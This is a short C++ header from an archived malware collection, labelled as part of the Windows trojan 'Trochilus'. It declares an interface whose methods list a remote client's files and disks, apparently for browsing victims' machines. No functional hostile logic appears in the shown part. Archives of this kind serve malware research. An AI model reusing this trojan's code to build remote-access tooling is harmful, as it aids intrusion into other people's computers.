/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "FileInfoStructs.h"

class IRCFileOperation
{
public:
	virtual BOOL ListClientFiles( LPCTSTR clientid, LPCTSTR findstr, FileInfoList& fileInfoList, BOOL bForceList = FALSE ) = 0;
	virtual BOOL ListClientDisks( LPCTSTR clientid, DiskInfoList& diskInfoList ) = 0;
};